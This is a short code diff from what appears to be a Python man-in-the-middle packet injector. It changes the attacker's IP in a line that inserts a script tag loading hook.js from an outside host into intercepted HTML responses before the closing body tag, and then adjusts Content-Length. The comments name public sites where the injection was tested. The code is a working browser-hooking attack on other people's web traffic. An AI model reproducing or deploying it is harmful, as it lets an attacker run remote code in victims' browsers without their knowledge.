@@ -28,7 +28,7 @@ def process_packet(packet):
             # Tested at: http://diabeticretinopathy.org.uk/exeforlaptops.html
             # http://angband.oook.cz/steamband/steamband.html
             # TODO: make the ip of the server as an argument to argparse.
-            injection_code = "<script src=\"http://10.0.2.15:3000/hook.js\"></script>"
+            injection_code = "<script src=\"http://192.168.0.27:3000/hook.js\"></script>"
             load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search(r"(?:Content-Length:\s)(\d*)", load)
             if content_length_search and "text/html" in load:
